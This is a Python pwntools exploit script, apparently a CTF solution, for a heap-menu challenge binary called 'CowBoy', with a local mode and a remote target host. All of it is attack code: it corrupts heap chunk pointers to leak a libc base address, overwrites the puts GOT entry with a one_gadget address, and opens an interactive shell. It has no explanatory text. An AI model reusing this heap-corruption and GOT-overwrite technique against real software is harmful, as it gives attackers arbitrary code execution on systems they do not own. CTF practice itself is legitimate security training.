#!/usr/bin/env python
from pwn import *
import json

def select(num):
    s.sendlineafter('5. exit\n----------------------------------------\n', str(num))

def alloc(size):
    select(1)
    s.sendline(str(size))
    s.recvuntil(' = ')
    return int(s.recvline(False), 16)

def free(binnum, chunknum):
    select(2)
    s.sendline(str(binnum))
    s.sendline(str(chunknum))

def show():
    select(3)
    ret = []
    for i in range(8):
        ret.append(map(lambda x: int(x, 16), s.recvline(False)[len('bin[0]: '):].split(' ')[:-1]))
    return ret

def fill(binnum, chunknum, data):
    select(4)
    s.sendline(str(binnum))
    s.sendline(str(chunknum))
    s.send(data)

if __name__ == '__main__':
    context.log_level = 'DEBUG' # it doesn't work without debug logs
    if len(sys.argv) == 1:
        s = process('./CowBoy', env = {'LD_PRELOAD': 'CowBoy_libc_56d992a0342a67a887b8dcaae381d2cc51205253'})
    else:
        s = remote('cowboy.eatpwnnosleep.com', 14697)

    elf = ELF('./CowBoy')
    libc = ELF('./CowBoy_libc_56d992a0342a67a887b8dcaae381d2cc51205253')

    addr = alloc(0x100)
    fill(4, 0, 'A' * 8 + p64(0x602090))
    alloc(0x10)
    fill(0, 0, 'A' * 8 + p64(addr))
    alloc(0x100)
    libc_base = show()[4][3] - 0x3af60
    log.info('libc base: %#x' % libc_base)

    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    fill(4, 0, p64(elf.got['puts']) + p64(0))
    fill(4, 2, p64(libc_base + one_gadgets[3]))
    s.interactive()
